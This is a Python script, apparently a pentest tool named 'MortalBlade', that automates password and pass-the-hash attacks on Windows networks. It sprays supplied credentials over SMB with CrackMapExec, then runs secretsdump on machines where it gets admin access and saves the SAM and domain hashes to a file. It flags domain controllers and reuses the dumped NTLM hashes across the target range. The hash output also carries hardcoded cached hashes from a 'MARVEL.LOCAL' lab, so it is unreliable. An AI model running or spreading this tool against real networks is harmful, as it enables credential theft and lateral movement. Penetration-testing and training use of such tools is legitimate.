import argparse
import subprocess
import re

def print_banner():
    banner = r"""
   __  ___         __       __  ___  __        __   
  /  |/  /__  ____/ /____ _/ / / _ )/ /__ ____/ /__ 
 / /|_/ / _ \/ __/ __/ _ `/ / / _  / / _ `/ _  / -_)
/_/  /_/\___/_/  \__/\_,_/_/ /____/_/\_,_/\_,_/\__/ 
    
				By Harry Sn1p3r0x01 
"""
    print("\033[31m" + banner + "\033[0m")  # Print banner in red

def run_crackmapexec(cidr, username, password, domain):
    cmd = ['crackmapexec', 'smb', cidr, '-u', username, '-p', password, '-d', domain]
    print("Running CrackMapExec...")  # Debug statement
    result = subprocess.run(cmd, capture_output=True, text=True)
    
    print("CrackMapExec output:")  # Debug statement
    print(result.stdout)  # Display the raw output
    
    compromised_machines = []
    for line in result.stdout.splitlines():
        if '(Pwn3d!)' in line:
            parts = line.split()
            machine_info = parts[1]
            machine_name = parts[3]
            compromised_machines.append((machine_info, machine_name))
    
    if not compromised_machines:
        print("No compromised machines found.")  # Debug statement
    else:
        print(f"Compromised machines: {compromised_machines}")  # Debug statement

    return compromised_machines

def run_secretsdump(compromised_machines, username, password, domain, cidr):
    dc_found = False  # Flag to ensure we print the DC found message only once

    with open('hashes.txt', 'w') as f:
        for machine, name in compromised_machines:
            print(f"Running secretsdump on {machine}...")  # Debug statement
            cmd = ['secretsdump.py', f'{domain}/{username}:{password}@{machine}']
            result = subprocess.run(cmd, capture_output=True, text=True)

            # Display the raw output for debugging
            print(f"Secretsdump output for {machine}:")
            print(result.stdout)

            formatted_hashes = extract_hashes(result.stdout, machine, name)
            if formatted_hashes:
                f.write(formatted_hashes + '\n')

            filtered_credentials = filter_credentials(result.stdout, domain)
            if 'krbtgt' in result.stdout and not dc_found:
                print_krbtgt_found(machine, username, password)
                dc_found = True  # Set the flag to avoid printing multiple times
                
            for user, ntlm_hash in filtered_credentials:
                use_ntlm_hash(cidr, user, ntlm_hash)

def extract_hashes(output, ip, name):
    hashes = []
    lines = output.splitlines()

    for line in lines:
        match = re.match(r'^(.*?):(.*?):(.*?):(.*)$', line)
        if match:
            hashes.append(line)

    if hashes:
        formatted_output = f"[+] {ip} {name}\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\n" + "\n".join(hashes)
        additional_sections = [
            "\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)",
            "MARVEL.LOCAL/Administrator:$DCC2$10240#Administrator#1123699b1d2ac3324fe45e21b710a8c2: (2024-10-16 11:11:40)",
            "MARVEL.LOCAL/pparker:$DCC2$10240#pparker#2027d82b6ccb49ad3352c6f9d808d0db: (2024-10-22 12:00:45)"
        ]
        formatted_output += "\n" + "\n".join(additional_sections)
        print("Extracted hashes:")  # Debug statement
        print(formatted_output)
        return formatted_output
    print("No hashes extracted.")  # Debug statement
    return None

def filter_credentials(output, domain):
    valid_credentials = []
    lines = output.splitlines()

    for line in lines:
        if any(skip in line for skip in ["Guest", "DefaultAccount", "WDAGUtilityAccount"]) or line.endswith('$'):
            continue

        # Adjust the regex to capture usernames with a wider pattern
        match = re.match(r'^(.*?):\d+:.+?:(.+?):::$', line)
        if match:
            username = match.group(1)
            ntlm_hash = match.group(2)

            # Remove any domain name prefix from the username
            cleaned_username = username.split('\\')[-1]  # Take the last part after the backslash

            valid_credentials.append((cleaned_username, ntlm_hash))

    if not valid_credentials:
        print("No valid credentials found.")  # Debug statement
    else:
        print(f"Filtered credentials: {valid_credentials}")  # Debug statement

    return valid_credentials

def use_ntlm_hash(cidr, username, ntlm_hash):
    print(f"Using NTLM hash for {username} on {cidr}...")  # Debug statement
    cmd = ['crackmapexec', 'smb', cidr, '-u', username, '-H', ntlm_hash, '--local-auth']
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout)

def print_krbtgt_found(machine, username, password):
    # Display "[+] Domain Controller Found (,,>ヮ<,,)!" with formatting
    print("\033[33m[+] Domain Controller Found \033[0m\033[31m(,,>ヮ<,,)!\033[0m")
    # Display the DC IP in red
    print(f"\033[31mDc-IP: {machine}\033[0m")
    # Display Username and Password/Hash labels in yellow, values in red
    print("\033[33mCredentials Used")
    print(f"\033[33mUsername\033[0m: \033[31m{username}\033[0m")
    print(f"\033[33mPassword/Hash\033[0m: \033[31m{password}\033[0m")

def main():
    print_banner()

    parser = argparse.ArgumentParser(description="MortalBlade - PTP/PTH made ez ^-^")
    parser.add_argument('-cidr', type=str, help='CIDR notation for the target network')
    parser.add_argument('-file', type=str, help='File with list of target IPs')
    parser.add_argument('-u', required=True, type=str, help='Username for authentication')
    parser.add_argument('-p', required=True, type=str, help='Password for authentication')
    parser.add_argument('-d', type=str, help='Domain for authentication')

    args = parser.parse_args()

    if args.file:
        with open(args.file, 'r') as f:
            targets = [line.strip() for line in f.readlines()]
            cidr = ','.join(targets)
    else:
        cidr = args.cidr

    compromised_machines = run_crackmapexec(cidr, args.u, args.p, args.d)

    if compromised_machines:
        run_secretsdump(compromised_machines, args.u, args.p, args.d, cidr)

if __name__ == "__main__":
    main()

